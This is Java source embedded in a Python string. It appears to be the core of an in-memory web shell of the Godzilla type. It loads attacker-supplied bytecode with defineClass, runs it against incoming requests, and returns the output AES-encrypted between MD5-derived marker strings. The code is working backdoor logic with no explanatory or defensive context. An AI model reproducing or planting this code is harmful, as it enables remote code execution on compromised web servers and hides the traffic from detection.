code = """
    public String b64encode(byte[] result) {
        Class base64;
        String str = null;
        try {
            base64 = Class.forName("java.util.Base64");
            str = (String) invokeMethod(
                getMethodX(base64, "getEncoder", 0).invoke(base64, null),
                "encodeToString", result
            );
        } catch (ClassNotFoundException e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                str = (String) invokeMethod(
                    base64.newInstance(), "encode", result
                );
            } catch (Exception ex) {}
        } catch (Exception ex) {}
        return str;
    }

    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (payload == null) {
            return null;
        }
        byte b[] = decoder(payload);
        if (lock instanceof Class) {
            java.io.ByteArrayOutputStream arrOut =
                new java.io.ByteArrayOutputStream();
            Object f = invokeMethod(lock, "newInstance");
            f.equals(arrOut);
            f.equals(request);
            f.equals(b);
            f.toString();
            String fix = hasher(
                password + hasher(password, "MD5").substring(0, 16), "MD5"
            );
            String result = fix.substring(0, 16).toUpperCase()+
                b64encode(cipher(arrOut.toByteArray(), "AES",
                    hasher(password, "MD5").substring(0, 16).getBytes(), true)
                )+
                fix.substring(16).toUpperCase();
            try {
                invokeMethod(invokeMethod(response, "getWriter"), "write", result);
            } catch (Exception e) {}
            return result;
        } else {
            lock = this.getClass().getConstructor(ClassLoader.class)
            .newInstance(this.getClass().getClassLoader())
            .defineClass(b, 0, b.length);
        }
        return null;
    }
"""